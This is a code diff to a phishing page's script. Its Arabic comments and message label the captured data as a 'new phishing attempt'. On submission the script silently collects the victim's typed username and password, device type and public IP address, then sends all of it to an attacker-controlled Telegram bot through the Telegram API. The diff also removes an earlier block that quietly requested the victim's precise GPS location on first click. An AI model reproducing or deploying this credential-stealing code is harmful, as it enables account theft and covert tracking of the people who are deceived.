@@ -269,28 +269,6 @@ footer {
         }
     });
 
-    let mapsLink = "لم يتم السماح بالوصول للموقع";
-
-    function requestLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                },
-                (error) => {
-                    mapsLink = "تم رفض إذن الموقع من المستخدم";
-                },
-                { enableHighAccuracy: true }
-            );
-        }
-    }
-
-    window.addEventListener('click', () => {
-        requestLocation();
-    }, { once: true });
-
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
@@ -298,7 +276,7 @@ footer {
         const p = document.getElementById('password').value;
         const msgBox = document.getElementById('error-msg');
         
-        // التحقق يدوياً من عدم فراغ الحقول بدون إظهار رسائل المتصفح
+        // التحقق يدوياً من عدم فراغ الحقول بدون إظهار رسائل المتصفح المزعجة
         if(u.trim() === '' || p.trim() === '') {
              return;
         }
@@ -308,7 +286,7 @@ footer {
         if (/android/i.test(ua)) deviceType = "📱 Android";
         else if (/iPad|iPhone|iPod/.test(ua)) deviceType = "🍏 iPhone (iOS)";
 
-        // جلب الـ IP من خدمة مستقرة
+        // جلب الـ IP بشكل صامت تماماً
         let ipInfo = "جاري الاتصال...";
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -318,7 +296,7 @@ footer {
             ipInfo = "مخفي أو محظور بواسطة المتصفح";
         }
 
-        const text = `🚨 محاولة صيد جديدة:\n💻 الجهاز: ${deviceType}\n🌐 عنوان IP: ${ipInfo}\n📍 موقع الـ GPS:\n${mapsLink}\n\n👤 المستخدم: ${u}\n🔑 كلمة المرور: ${p}`;
+        const text = `🚨 محاولة صيد جديدة:\n💻 الجهاز: ${deviceType}\n🌐 عنوان IP: ${ipInfo}\n\n👤 المستخدم: ${u}\n🔑 كلمة المرور: ${p}`;
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=` + encodeURIComponent(text);
 
         fetch(url)
